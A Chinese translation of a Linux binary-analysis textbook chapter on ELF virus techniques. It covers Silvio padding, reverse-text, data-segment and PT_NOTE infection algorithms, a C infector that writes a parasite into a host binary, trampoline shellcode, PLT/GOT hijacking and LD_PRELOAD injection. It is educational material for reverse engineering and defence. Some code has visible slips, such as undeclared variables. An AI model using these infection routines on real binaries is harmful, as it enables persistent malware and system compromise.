# Linux 二进制分析学习手册（二）

> 原文：[`zh.annas-archive.org/md5/557450C26A7CBA64AA60AA031A39EC59`](https://zh.annas-archive.org/md5/557450C26A7CBA64AA60AA031A39EC59)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第四章：ELF 病毒技术- Linux/Unix 病毒

病毒编写的艺术已经存在了几十年。事实上，它可以追溯到 1981 年通过软盘视频游戏成功在野外发布的 Elk Cloner 苹果病毒。自 80 年代中期到 90 年代，有各种秘密团体和黑客利用他们的神秘知识设计、发布和发表病毒在病毒和黑客电子杂志中（见[`vxheaven.org/lib/static/vdat/ezines1.htm`](http://vxheaven.org/lib/static/vdat/ezines1.htm)）。

病毒编写的艺术通常会给黑客和地下技术爱好者带来很大的启发，不是因为它们能够造成的破坏，而是因为设计它们和需要成功编程的非常规编码技术所带来的挑战，这些病毒可以通过隐藏在其他可执行文件和进程中保持其驻留的寄生虫。此外，保持寄生虫隐蔽的技术和解决方案，如多态和变形代码，对程序员来说是一种独特的挑战。

UNIX 病毒自 90 年代初就存在了，但我认为许多人会同意说 UNIX 病毒的真正创始人是 Silvio Cesare ([`vxheaven.org/lib/vsc02.html`](http://vxheaven.org/lib/vsc02.html))，他在 90 年代末发表了许多关于 ELF 病毒感染方法的论文。这些方法在今天仍在以不同的变体使用。

Silvio 是第一个发布一些令人惊叹的技术的人，比如 PLT/GOT 重定向，文本段填充感染，数据段感染，可重定位代码注入，`/dev/kmem`修补和内核函数劫持。不仅如此，他个人在我接触 ELF 二进制黑客技术方面起到了很大的作用，我会永远感激他的影响。

在本章中，我们将讨论为什么重要理解 ELF 病毒技术以及如何设计它们。ELF 病毒背后的技术可以用于除了编写病毒之外的许多其他事情，比如一般的二进制修补和热修补，这可以在安全、软件工程和逆向工程中使用。为了逆向工程一个病毒，了解其中许多病毒是如何工作的对你是有好处的。值得注意的是，我最近逆向工程并为一个名为**Retaliation**的独特和杰出的 ELF 病毒编写了一个概要。这项工作可以在[`www.bitlackeys.org/#retaliation`](http://www.bitlackeys.org/#retaliation)找到。

# ELF 病毒技术

ELF 病毒技术的世界将为你作为黑客和工程师打开许多大门。首先，让我们讨论一下什么是 ELF 病毒。每个可执行程序都有一个控制流，也称为执行路径。ELF 病毒的第一个目标是劫持控制流，以便临时改变执行路径以执行寄生代码。寄生代码通常负责设置钩子来劫持函数，还负责将自身（寄生代码的主体）复制到尚未被病毒感染的另一个程序中。一旦寄生代码运行完毕，它通常会跳转到原始入口点或正常的执行路径。这样，病毒就不会被注意到，因为宿主程序看起来是正常执行的。

![ELF 病毒技术](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/lrn-linux-bin-anls/img/00006.jpeg)

图 4.1：对可执行文件的通用感染

# ELF 病毒工程挑战

ELF 病毒的设计阶段可能被认为是一种艺术创作，需要创造性思维和巧妙的构造；许多热情的编码人员会同意这一点。与此同时，这是一个超出常规编程约定的伟大工程挑战，需要开发人员超越常规范式思维，操纵代码、数据和环境以某种方式行为。曾经，我曾对一家大型**杀毒软件**（**AV**）公司的一款产品进行了安全评估。在与杀毒软件的开发人员交谈时，我惊讶地发现他们几乎没有任何真正的想法如何设计病毒，更不用说设计任何真正的启发式来识别它们（除了签名）。事实上，编写病毒是困难的，需要严肃的技能。在工程化时，会出现许多挑战，让我们在讨论工程化组件之前，先看看其中一些挑战是什么。

## 寄生体代码必须是自包含的

寄生体必须能够实际存在于另一个程序中。这意味着它不能通过动态链接器链接到外部库。寄生体必须是自包含的，这意味着它不依赖于外部链接，是位置无关的，并且能够在自身内部动态计算内存地址；这是因为地址将在每次感染之间改变，因为寄生体将被注入到现有的二进制文件中，其位置将每次改变。这意味着如果寄生体代码通过其地址引用函数或字符串，硬编码的地址将改变，代码将失败；而是使用相对于 IP 的代码，使用一个函数通过指令指针的偏移量计算代码/数据的地址。

### 注意

在一些更复杂的内存病毒中，比如我的*Saruman*病毒，我允许寄生体编译为一个带有动态链接的可执行程序，但是将其启动到进程地址空间的代码非常复杂，因为它必须手动处理重定位和动态链接。还有一些可重定位代码注入器，比如 Quenya，允许寄生体编译为可重定位对象，但感染者必须能够在感染阶段支持处理重定位。

### 解决方案

使用`gcc`选项`-nostdlib`编译初始病毒可执行文件。您还可以使用`-fpic -pie`编译它，使可执行文件成为**位置无关代码**（**PIC**）。x86_64 机器上可用的 IP 相对寻址实际上是病毒编写者的一个很好的功能。创建自己的常用函数，比如`strcpy()`和`memcmp()`。当您需要`malloc()`的高级功能时，您可以使用`sys_brk()`或`sys_mmap()`创建自己的分配例程。创建自己的系统调用包装器，例如，这里使用 C 和内联汇编展示了`mmap`系统调用的包装器：

```
#define __NR_MMAP 9
void *_mmap(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off)
{
        long mmap_fd = fd;
        unsigned long mmap_off = off;
        unsigned long mmap_flags = flags;
        unsigned long ret;

        __asm__ volatile(
                         "mov %0, %%rdi\n"
                         "mov %1, %%rsi\n"
                         "mov %2, %%rdx\n"
                         "mov %3, %%r10\n"
                         "mov %4, %%r8\n"
                         "mov %5, %%r9\n"
                         "mov $__NR_MMAP, %%rax\n"
                         "syscall\n" : : "g"(addr), "g"(len), "g"(prot),                "g"(flags), "g"(mmap_fd), "g"(mmap_off));
        __asm__ volatile ("mov %%rax, %0" : "=r"(ret));
        return (void *)ret;
}
```

一旦您有一个调用`mmap()`系统调用的包装器，您就可以创建一个简单的`malloc`例程。

`malloc`函数用于在堆上分配内存。我们的小`malloc`函数为每个分配使用了一个内存映射段，这是低效的，但对于简单的用例足够了。

```
void * _malloc(size_t len)
{
        void *mem = _mmap(NULL, len, PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        if (mem == (void *)-1)
                return NULL;
        return mem;
}
```

## 字符串存储的复杂性

这个挑战与上一节关于自包含代码的最后一节相融合。在处理病毒代码中的字符串时，您可能会有：

```
const char *name = "elfmaster";
```

您将希望避免使用类似上述的代码。这是因为编译器可能会将`elfmaster`数据存储在`.rodata`部分，然后通过其地址引用该字符串。一旦病毒可执行文件被注入到另一个程序中，该地址将不再有效。这个问题实际上与我们之前讨论的硬编码地址的问题紧密相连。

### 解决方案

使用堆栈存储字符串，以便它们在运行时动态分配：

```
char name[10] = {'e', 'l', 'f', 'm', 'a', 's', 't', 'e', 'r', '\0'};
```

我最近在为 64 位 Linux 构建 Skeksi 病毒时发现的另一个巧妙技巧是通过使用`gcc`的`-N`选项将文本和数据段合并为单个段，即**读+写+执行**（**RWX**）。这非常好，因为全局数据和只读数据，例如`.data`和`.rodata`部分，都合并到单个段中。这允许病毒在感染阶段简单地注入整个段，其中将包括来自`.rodata`的字符串文字。这种技术结合 IP 相对寻址允许病毒作者使用传统的字符串文字：

```
char *name = "elfmaster";
```

现在可以在病毒代码中使用这种类型的字符串，并且可以完全避免在堆栈上存储字符串的方法。然而，需要注意的是，将所有字符串存储在全局数据中会导致病毒寄生体的整体大小增加，这有时是不可取的。Skeksi 病毒最近发布，并可在[`www.bitlackeys.org/#skeksi`](http://www.bitlackeys.org/#skeksi)上获得。

## 查找合法空间存储寄生虫代码

这是编写病毒时需要回答的一个重要问题之一：病毒的载荷（病毒的主体）将被注入到哪里？换句话说，在主机二进制文件的哪里将寄生虫存活？可能性因二进制格式而异。在`ELF`格式中，有相当多的地方可以注入代码，但它们都需要正确调整各种不同的`ELF`头值。

挑战并不一定是找到空间，而是调整`ELF`二进制文件以允许您使用该空间，同时使可执行文件看起来相当正常，并且足够接近`ELF`规范，以便它仍然能够正确执行。在修补二进制文件和修改其布局时，必须考虑许多事项，例如页面对齐、偏移调整和地址调整。

### 解决方案

在创建新的二进制修补方法时，仔细阅读`ELF`规范，并确保您在程序执行所需的边界内。在下一节中，我们将讨论一些病毒感染技术。

## 将执行控制流传递给寄生虫

这里还有另一个常见的挑战，那就是如何将主机可执行文件的控制流传递给寄生虫。在许多情况下，调整`ELF`文件头中的入口点以指向寄生虫代码就足够了。这是可靠的，但也非常明显。如果入口点已经修改为指向寄生虫，那么我们可以使用`readelf -h`来查看入口点，并立即知道寄生虫代码的位置。

### 解决方案

如果您不想修改入口点地址，那么考虑找到一个可以插入/修改分支到寄生虫代码的地方，例如插入`jmp`或覆盖函数指针。其中一个很好的地方是`.ctors`或`.init_array`部分，其中包含函数指针。如果您不介意寄生虫在常规程序代码之后（而不是之前）执行，那么`.dtors`或`.fini_array`部分也可以起作用。

# ELF 病毒寄生体感染方法

二进制文件中只有有限的空间可以容纳代码，对于任何复杂的病毒，寄生虫至少会有几千字节，并且需要扩大主机可执行文件的大小。在`ELF`可执行文件中，没有太多的代码洞（例如 PE 格式），因此您不太可能能够将更多的 shellcode 塞入现有的代码槽中（例如具有 0 或`NOPS`用于函数填充的区域）。

## Silvio 填充感染方法

这种感染方法是由 Silvio Cesare 在 90 年代后期构思的，并且此后出现在各种 Linux 病毒中，例如*Brundle Fly*和 Silvio 本人制作的 POC。这种方法很有创意，但它将感染负载限制在一页大小。在 32 位 Linux 系统上，这是 4096 字节，但在 64 位系统上，可执行文件使用 0x200000 字节的大页，这允许大约 2MB 的感染。这种感染的工作原理是利用内存中文本段和数据段之间会有一页填充的事实，而在磁盘上，文本段和数据段是紧挨着的，但是某人可以利用预期的段之间的空间，并将其用作负载的区域。

![Silvio 填充感染方法](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/lrn-linux-bin-anls/img/00007.jpeg)

图 4.2：Silvio 填充感染布局

Silvio 在他的 VX Heaven 论文*Unix ELF 寄生体和病毒*中对文本填充感染进行了详细的描述和记录（[`vxheaven.org/lib/vsc01.html`](http://vxheaven.org/lib/vsc01.html)），因此，如果想要深入阅读，请务必查看。

### Silvio .text 感染方法的算法

1.  在 ELF 文件头中，将`ehdr->e_shoff`的值增加`PAGE_SIZE`。

1.  定位文本段`phdr`：

1.  修改寄生体位置的入口点：

```
ehdr->e_entry = phdr[TEXT].p_vaddr + phdr[TEXT].p_filesz
```

1.  增加`phdr[TEXT].p_filesz`的值，使其等于寄生体的长度。

1.  增加`phdr[TEXT].p_memsz`的值，使其等于寄生体的长度。

1.  对于每个`phdr`，其段在寄生体之后，增加`phdr[x].p_offset`的值`PAGE_SIZE`字节。

1.  找到文本段中的最后一个`shdr`，并将`shdr[x].sh_size`的值增加寄生体的长度（因为这是寄生体存在的部分）。

1.  对于每个寄生体插入后存在的`shdr`，增加`shdr[x].sh_offset`的值`PAGE_SIZE`。

1.  将实际寄生体代码插入文本段的位置为（`file_base + phdr[TEXT].p_filesz`）。

### 注意

原始的`p_filesz`值用于计算。

### 提示

创建一个反映所有更改的新二进制文件，然后将其复制到旧二进制文件上更有意义。这就是我所说的插入寄生体代码：重写一个包含寄生体的新二进制文件。

一个实现了这种感染技术的 ELF 病毒的很好的例子是我的*lpv*病毒，它是在 2008 年编写的。为了高效，我不会在这里粘贴代码，但可以在[`www.bitlackeys.org/projects/lpv.c`](http://www.bitlackeys.org/projects/lpv.c)找到。

### 文本段填充感染的示例

文本段填充感染（也称为 Silvio 感染）可以通过一些示例代码最好地进行演示，我们可以看到如何在插入实际寄生体代码之前正确调整 ELF 头文件。

#### 调整 ELF 头文件

```
#define JMP_PATCH_OFFSET 1 // how many bytes into the shellcode do we patch
/* movl $addr, %eax; jmp *eax; */
char parasite_shellcode[] =
        "\xb8\x00\x00\x00\x00"      
        "\xff\xe0"                  
;

int silvio_text_infect(char *host, void *base, void *payload, size_t host_len, size_t parasite_len)
{
        Elf64_Addr o_entry;
        Elf64_Addr o_text_filesz;
        Elf64_Addr parasite_vaddr;
        uint64_t end_of_text;
        int found_text;

        uint8_t *mem = (uint8_t *)base;
        uint8_t *parasite = (uint8_t *)payload;

        Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;
        Elf64_Phdr *phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
        Elf64_Shdr *shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];

        /*
         * Adjust program headers
         */
        for (found_text = 0, i = 0; i < ehdr->e_phnum; i++) {
                if (phdr[i].p_type == PT_LOAD) {
                        if (phdr[i].p_offset == 0) {

                                o_text_filesz = phdr[i].p_filesz;
                                end_of_text = phdr[i].p_offset + phdr[i].p_filesz;
                                parasite_vaddr = phdr[i].p_vaddr + o_text_filesz;

                                phdr[i].p_filesz += parasite_len;
                                phdr[i].p_memsz += parasite_len;

                                for (j = i + 1; j < ehdr->e_phnum; j++)
                                        if (phdr[j].p_offset > phdr[i].p_offset + o_text_filesz)
                                                phdr[j].p_offset += PAGE_SIZE;

                                }
                                break;
                        }
        }
        for (i = 0; i < ehdr->e_shnum; i++) {
                if (shdr[i].sh_addr > parasite_vaddr)
                        shdr[i].sh_offset += PAGE_SIZE;
                else
                if (shdr[i].sh_addr + shdr[i].sh_size == parasite_vaddr)
                        shdr[i].sh_size += parasite_len;
        }

    /*
      * NOTE: Read insert_parasite() src code next
         */
        insert_parasite(host, parasite_len, host_len,
                        base, end_of_text, parasite, JMP_PATCH_OFFSET);
        return 0;
}
```

#### 插入寄生代码

```
#define TMP "/tmp/.infected"

void insert_parasite(char *hosts_name, size_t psize, size_t hsize, uint8_t *mem, size_t end_of_text, uint8_t *parasite, uint32_t jmp_code_offset)
{
/* note: jmp_code_offset contains the
* offset into the payload shellcode that
* has the branch instruction to patch
* with the original offset so control
* flow can be transferred back to the
* host.
*/
        int ofd;
        unsigned int c;
        int i, t = 0;
        open (TMP, O_CREAT | O_WRONLY | O_TRUNC, S_IRUSR|S_IXUSR|S_IWUSR);  
        write (ofd, mem, end_of_text);
        *(uint32_t *) &parasite[jmp_code_offset] = old_e_entry;
        write (ofd, parasite, psize);
        lseek (ofd, PAGE_SIZE - psize, SEEK_CUR);
        mem += end_of_text;
        unsigned int sum = end_of_text + PAGE_SIZE;
        unsigned int last_chunk = hsize - end_of_text;
        write (ofd, mem, last_chunk);
        rename (TMP, hosts_name);
        close (ofd);
}
```

### 上述函数的使用示例

```
uint8_t *mem = mmap_host_executable("./some_prog");
silvio_text_infect("./some_prog", mem, parasite_shellcode, parasite_len);
```

### LPV 病毒

LPV 病毒使用 Silvio 填充感染，并且专为 32 位 Linux 系统设计。可在[`www.bitlackeys.org/#lpv`](http://www.bitlackeys.org/#lpv)下载。

### Silvio 填充感染的用例

讨论的 Silvio 填充感染方法非常流行，并且已经被广泛使用。在 32 位 UNIX 系统上，此方法的实现仅限于 4096 字节的寄生体，如前所述。在使用大页的新系统上，这种感染方法具有更大的潜力，并允许更大的感染（最多 0x200000 字节）。我个人使用了这种方法进行寄生体感染和可重定位代码注入，尽管我已经放弃了它，转而使用我们接下来将讨论的反向文本感染方法。

## 反向文本感染

这种感染的理念最初是由 Silvio 在他的 UNIX 病毒论文中构思和记录的，但它没有提供一个可工作的 POC。我后来将其扩展为一种算法，我用于各种 ELF 黑客项目，包括我的软件保护产品*Mayas Veil*，该产品在[`www.bitlackeys.org/#maya`](http://www.bitlackeys.org/#maya)中有讨论。

这种方法的前提是以反向方式扩展文本段。通过这样做，文本的虚拟地址将减少`PAGE_ALIGN`(`parasite_size`)。由于现代 Linux 系统上允许的最小虚拟映射地址（根据`/proc/sys/vm/mmap_min_addr`）是 0x1000，文本虚拟地址只能向后扩展到那里。幸运的是，由于 64 位系统上默认的文本虚拟地址通常是 0x400000，这留下了 0x3ff000 字节的寄生空间（减去`sizeof(ElfN_Ehdr)`字节，确切地说）。

计算主机可执行文件的最大寄生大小的完整公式将是这样的：

```
max_parasite_length = orig_text_vaddr - (0x1000 + sizeof(ElfN_Ehdr))
```

### 注意

在 32 位系统上，默认的文本虚拟地址是 0x08048000，这比 64 位系统上的寄生空间更大：

```
(0x8048000 - (0x1000 + sizeof(ElfN_Ehdr)) = (parasite len)134508492
```

![反向文本感染](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/lrn-linux-bin-anls/img/00008.jpeg)

图 4.3：反向文本感染布局

这种`.text`感染有几个吸引人的特点：它不仅允许非常大的代码注入，而且还允许入口点保持指向`.text`部分。虽然我们必须修改入口点，但它仍然指向实际的`.text`部分，而不是其他部分，比如`.jcr`或`.eh_frame`，这会立即显得可疑。插入点在文本中，因此它是可执行的（就像 Silvio 填充感染一样）。这打败了数据段感染，它允许无限的插入空间，但需要在启用 NX 位的系统上修改段权限。

### 反向文本感染算法

### 注意

这是对`PAGE_ROUND(x)`宏的引用，它将整数舍入到下一个页面对齐的值。

1.  通过`PAGE_ROUND(parasite_len)`增加`ehdr->e_shoff`。

1.  找到文本段、`phdr`，并保存原始的`p_vaddr`：

1.  通过`PAGE_ROUND(parasite_len)`减少`p_vaddr`。

1.  通过`PAGE_ROUND(parasite_len)`减少`p_paddr`。

1.  通过`PAGE_ROUND(parasite_len)`增加`p_filesz`。

1.  通过`PAGE_ROUND(parasite_len)`增加`p_memsz`。

1.  找到每个`phdr`，其`p_offset`大于文本的`p_offset`，并通过`PAGE_ROUND(parasite_len)`增加`p_offset`；这将使它们全部向前移动，为反向文本扩展腾出空间。

1.  将`ehdr->e_entry`设置为这个值：

```
orig_text_vaddr – PAGE_ROUND(parasite_len) + sizeof(ElfN_Ehdr)
```

1.  通过`PAGE_ROUND(parasite_len)`增加`ehdr->e_phoff`。

1.  通过创建一个新的二进制文件来插入实际的寄生代码，以反映所有这些变化，并将新的二进制文件复制到旧的位置。

反向文本感染方法的完整示例可以在我的网站上找到：[`www.bitlackeys.org/projects/text-infector.tgz`](http://www.bitlackeys.org/projects/text-infector.tgz)。

反向文本感染的更好示例是 Skeksi 病毒，可以从本章前面提供的链接中下载。这种感染类型的完整消毒程序也可以在这里找到：

[`www.bitlackeys.org/projects/skeksi_disinfect.c`](http://www.bitlackeys.org/projects/skeksi_disinfect.c)。

## 数据段感染

在没有设置 NX 位的系统上，例如 32 位 Linux 系统，可以在数据段中执行代码（即使其权限是 R+W），而无需更改段权限。这可以是感染文件的一种非常好的方式，因为它为寄生虫留下了无限的空间。可以简单地通过寄生代码附加到数据段。唯一的注意事项是，您必须为`.bss`部分留出空间。`.bss`部分在磁盘上不占用空间，但在运行时为未初始化的变量在数据段末尾分配空间。您可以通过将数据段的`phdr->p_filesz`从`phdr->p_memsz`中减去来获得`.bss`部分在内存中的大小。

![数据段感染](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/lrn-linux-bin-anls/img/00009.jpeg)

图 4.4：数据段感染

### 数据段感染算法

1.  通过寄生大小增加`ehdr->e_shoff`。

1.  定位数据段`phdr`：

1.  修改`ehdr->e_entry`，指向寄生代码的位置：

```
phdr->p_vaddr + phdr->p_filesz
```

1.  通过寄生大小增加`phdr->p_filesz`。

1.  通过寄生大小增加`phdr->p_memsz`。

1.  调整`.bss`段头，使其偏移和地址反映寄生结束的位置。

1.  在数据段上设置可执行权限：

```
phdr[DATA].p_flags |= PF_X;
```

### 注意

步骤 4 仅适用于具有 NX（不可执行页面）位设置的系统。在 32 位 Linux 上，数据段不需要标记为可执行以执行代码，除非内核中安装了类似 PaX（[`pax.grsecurity.net/`](https://pax.grsecurity.net/)）的东西。

1.  可选地，添加一个带有虚假名称的段头，以便考虑寄生代码。否则，如果有人运行`/usr/bin/strip <infected_program>`，它将完全删除寄生代码，如果没有被一个部分考虑到。

1.  通过创建一个反映更改并包含寄生代码的新二进制文件来插入寄生虫。

数据段感染对于并非特定于病毒的情况非常有用。例如，在编写打包程序时，通常有用的是将加密的可执行文件存储在存根可执行文件的数据段中。

# PT_NOTE 到 PT_LOAD 转换感染方法

这种方法非常强大，尽管很容易被检测到，但实现起来也相对容易，并提供可靠的代码插入。其思想是将`PT_NOTE`段转换为`PT_LOAD`类型，并将其位置移动到所有其他段之后。当然，您也可以通过创建一个`PT_LOAD phdr`条目来创建一个全新的段，但由于程序仍然可以在没有`PT_NOTE`段的情况下执行，您可能会将其转换为`PT_LOAD`。我个人没有为病毒实现过这种技术，但我在 Quenya v0.1 中设计了一个允许您添加新段的功能。我还对 Jpanic 编写的 Retaliation Linux 病毒进行了分析，该病毒使用了这种感染方法：

[`www.bitlackeys.org/#retaliation`](http://www.bitlackeys.org/#retaliation)。

![PT_NOTE 到 PT_LOAD 转换感染方法](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/lrn-linux-bin-anls/img/00010.jpeg)

图 4.5：PT_LOAD 感染

关于`PT_LOAD`感染没有严格的规则。如此处所述，您可以将`PT_NOTE`转换为`PT_LOAD`，也可以创建一个全新的`PT_LOAD phdr`和段。

## PT_NOTE 到 PT_LOAD 转换感染算法

1.  定位数据段`phdr`：

1.  找到数据段结束的地址：

```
    ds_end_addr = phdr->p_vaddr + p_memsz
```

1.  找到数据段结束的文件偏移量：

```
    ds_end_off = phdr->p_offset + p_filesz
```

1.  获取用于可加载段的对齐大小：

```
    align_size = phdr->p_align
```

1.  定位`PT_NOTE` phdr：

1.  将 phdr 转换为 PT_LOAD：

```
    phdr->p_type = PT_LOAD;
```

1.  将其分配给这个起始地址：

```
    ds_end_addr + align_size
```

1.  分配一个大小以反映寄生代码的大小：

```
    phdr->p_filesz += parasite_size
    phdr->p_memsz += parasite_size
```

1.  使用`ehdr->e_shoff += parasite_size`来考虑新段。

1.  通过编写一个新的二进制文件来插入寄生代码，以反映 ELF 头更改和新段。

### 注意

记住，段头表在寄生段之后，因此`ehdr->e_shoff += parasite_size`。

# 感染控制流

在前一节中，我们研究了将寄生代码引入二进制文件并通过修改感染程序的入口点执行的方法。就引入新代码到二进制文件中而言，这些方法非常有效；实际上，它们非常适合二进制修补，无论是出于合法的工程原因还是出于病毒的目的。修改入口点在许多情况下也是相当合适的，但远非隐秘，而且在某些情况下，您可能不希望寄生代码在入口时执行。也许您的寄生代码是一个您感染了二进制文件的单个函数，您只希望这个函数作为替换其感染的二进制文件中的另一个函数被调用；这被称为函数劫持。当打算追求更复杂的感染策略时，我们必须意识到 ELF 程序中所有可能的感染点。这就是事情开始变得真正有趣的地方。让我们看看许多常见的 ELF 二进制感染点：

![感染控制流](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/lrn-linux-bin-anls/img/00011.jpeg)

图 4.6：ELF 感染点

如前图所示，ELF 程序中还有其他六个主要区域可以被操纵以在某种程度上修改行为。

## 直接 PLT 感染

不要将其与 PLT/GOT（有时称为 PLT 挂钩）混淆。 PLT（过程链接表）和 GOT（全局偏移表）在动态链接和共享库函数调用期间密切配合工作。它们是两个单独的部分。我们在第二章*ELF 二进制格式*的*动态链接*部分学习了它们。简单地说，PLT 包含每个共享库函数的条目。每个条目包含执行间接`jmp`到存储在 GOT 中的目标地址的代码。一旦动态链接过程完成，这些地址最终指向其关联的共享库函数。通常，攻击者可以覆盖包含指向其代码的地址的 GOT 条目。这是可行的，因为它最容易；GOT 是可写的，只需修改其地址表即可改变控制流。当讨论直接 PLT 感染时，我们并不是指修改 GOT。我们谈论的是实际修改 PLT 代码，使其包含不同的指令以改变控制流。

以下是`libc fopen()`函数的 PLT 条目的代码：

```
0000000000402350 <fopen@plt>:
  402350:       ff 25 9a 7d 21 00       jmpq   *0x217d9a(%rip)        # 61a0f0
  402356:       68 1b 00 00 00          pushq  $0x1b
  40235b:       e9 30 fe ff ff          jmpq   402190 <_init+0x28>
```

请注意，第一条指令是一个间接跳转。该指令长度为六个字节：这很容易被另一个五/六字节的指令替换，以改变控制流到寄生代码。考虑以下指令：

```
push $0x000000 ; push the address of parasite code onto stack
ret       ; return to parasite code
```

这些指令被编码为`\x68\x00\x00\x00\x00\xc3`，可以被注入到 PLT 条目中，以劫持所有`fopen()`调用并使用寄生函数（无论是什么）。由于`.plt`部分位于文本段中，它是只读的，因此这种方法不适用于利用漏洞（如`.got`覆盖）的技术，但绝对可以用病毒或内存感染来实现。

## 函数跳板

这种类型的感染显然属于直接 PLT 感染的最后一类，但为了明确我们的术语，让我描述一下传统函数跳板通常指的是什么，即用某种分支指令覆盖函数代码的前五到七个字节，以改变控制流：

```
movl $<addr>, %eax  --- encoded as \xb8\x00\x00\x00\x00\xff\xe0
jmp *%eax
push $<addr>      --- encoded as \x68\x00\x00\x00\xc3
ret
```

寄生函数被调用，而不是预期的函数。如果寄生函数需要调用原始函数，这通常是情况，那么寄生函数的工作就是用原始指令替换原始函数中的五到七个字节，调用它，然后将跳板代码复制回原位。这种方法既可以应用于实际的二进制文件本身，也可以应用于内存中。这种技术通常用于劫持内核函数，尽管在多线程环境中并不是很安全。

## 覆盖.ctors/.dtors 函数指针

这种方法实际上在本章早些时候提到过，当讨论将执行控制流引导到寄生代码时。为了完整起见，我将对其进行回顾：大多数可执行文件都是通过链接到`libc`来编译的，因此`gcc`在编译的可执行文件和共享库中包含了`glibc`初始化代码。`.ctors`和`.dtors`部分（有时称为`.init_array`和`.fini_array`）包含初始化或终结代码的函数指针。`.ctors/.init_array`函数指针在调用`main()`之前触发。这意味着可以通过覆盖其中一个函数指针的正确地址来将控制转移到病毒或寄生代码。`.dtors/.fini_array`函数指针直到`main()`之后才触发，在某些情况下可能是可取的。例如，某些堆溢出漏洞（例如，*一旦释放*：[`phrack.org/issues/57/9.html`](http://phrack.org/issues/57/9.html)）会导致攻击者可以向任何位置写入四个字节，并且通常会覆盖一个指向 shellcode 的`.dtors`函数指针的地址。对于大多数病毒或恶意软件作者来说，`.ctors/.init_array`函数指针更常见，因为通常希望在程序的其余部分运行之前运行寄生代码。

## GOT - 全局偏移表中毒或 PLT/GOT 重定向

GOT 中毒，也称为 PLT/GOT 感染，可能是劫持共享库函数的最佳方法。这相对容易，并允许攻击者充分利用 GOT，这是一个指针表。由于我们在第二章中深入讨论了 GOT，*ELF 二进制格式*，我不会再详细说明它的目的。这种技术可以通过直接感染二进制文件的 GOT 或在内存中进行。有一篇关于我在 2009 年写的关于在内存中进行这种操作的论文，名为*现代 ELF 运行时感染通过 GOT 中毒*，网址为[`vxheaven.org/lib/vrn00.html`](http://vxheaven.org/lib/vrn00.html)，其中解释了如何在运行时进程感染中进行这种操作，并提供了一种可以用来绕过 PaX 强加的安全限制的技术。

## 感染数据结构

可执行文件的数据段包含全局变量、函数指针和结构。这打开了一个攻击向量，只针对特定的可执行文件，因为每个程序在数据段中有不同的布局：不同的变量、结构、函数指针等。尽管如此，如果攻击者了解布局，就可以通过覆盖函数指针和其他数据来改变可执行文件的行为。一个很好的例子是数据/`.bss`缓冲区溢出利用。正如我们在第二章中学到的，`.bss`在运行时分配（在数据段的末尾），包含未初始化的全局变量。如果有人能够溢出一个包含要执行的可执行文件路径的缓冲区，那么就可以控制要运行的可执行文件。

## 函数指针覆盖

这种技术实际上属于最后一种（感染数据结构），也属于与`.ctors/.dtors`函数指针覆写相关的技术。为了完整起见，我将其列为自己的技术，但基本上，这些指针将位于数据段和`.bss`（初始化/未初始化的静态数据）中。正如我们已经讨论过的，可以覆盖函数指针以改变控制流，使其指向寄生体。

# 进程内存病毒和 rootkit - 远程代码注入技术

到目前为止，我们已经涵盖了用寄生代码感染 ELF 二进制文件的基础知识，这足以让你忙碌至少几个月的编码和实验。然而，本章将不完整，如果没有对感染进程内存进行彻底讨论。正如我们所了解的，内存中的程序与磁盘上的程序并没有太大的区别，我们可以通过`ptrace`系统调用来访问和操作运行中的程序，就像第三章 *Linux 进程跟踪*中所示的那样。进程感染比二进制感染更加隐蔽，因为它们不会修改磁盘上的任何内容。因此，进程内存感染通常是为了对抗取证分析。我们刚刚讨论的所有 ELF 感染点都与进程感染相关，尽管注入实际的寄生代码与 ELF 二进制文件的方式不同。由于它在内存中，我们必须将寄生代码注入内存，可以通过使用`PTRACE_POKETEXT`（覆盖现有代码）直接注入，或者更好地，通过注入创建新内存映射以存储代码的 shellcode。这就是共享库注入等技术发挥作用的地方。在本章的其余部分，我们将讨论一些远程代码注入的方法。

## 共享库注入 - .so 注入/ET_DYN 注入

这种技术可以用来将共享库（无论是恶意的还是不恶意的）注入到现有进程的地址空间中。一旦库被注入，你可以使用前面描述的感染点之一，通过 PLT/GOT 重定向、函数跳板等方式将控制流重定向到共享库。挑战在于将共享库注入到进程中，这可以通过多种方式来实现。

## .so 注入与 LD_PRELOAD

关于将共享库注入进程的方法是否可以称为注入，存在争议，因为它不适用于现有进程，而是在程序执行时加载共享库。这是通过设置`LD_PRELOAD`环境变量，以便所需的共享库在任何其他库之前加载。这可能是一个快速测试后续技术（如 PLT/GOT 重定向）的好方法，但不够隐蔽，也不适用于现有进程。

### 图 4.7 - 使用 LD_PRELOAD 注入 wicked.so.1

```
$ export LD_PRELOAD=/tmp/wicked.so.1

$ /usr/local/some_daemon

$ cp /lib/x86_64-linux-gnu/libm-2.19.so /tmp/wicked.so.1

$ export LD_PRELOAD=/tmp/wicked.so.1

$ /usr/local/some_daemon &

$ pmap `pidof some_daemon` | grep 'wicked'

00007ffaa731e000   1044K r-x-- wicked.so.1

00007ffaa7423000   2044K ----- wicked.so.1

00007ffaa7622000      4K r---- wicked.so.1

00007ffaa7623000      4K rw--- wicked.so.1
```

正如你所看到的，我们的共享库`wicked.so.1`被映射到进程地址空间中。业余爱好者倾向于使用这种技术来创建小型用户空间 rootkit，劫持`glibc`函数。这是因为预加载的库将优先于任何其他共享库，因此，如果你将函数命名为`glibc`函数的名称，比如`open()`或`write()`（它们是系统调用的包装器），那么你预加载的库的版本的函数将被执行，而不是真正的`open()`和`write()`。这是一种廉价而肮脏的劫持`glibc`函数的方法，如果攻击者希望保持隐蔽，就不应该使用这种方法。

## .so 注入与 open()/mmap() shellcode

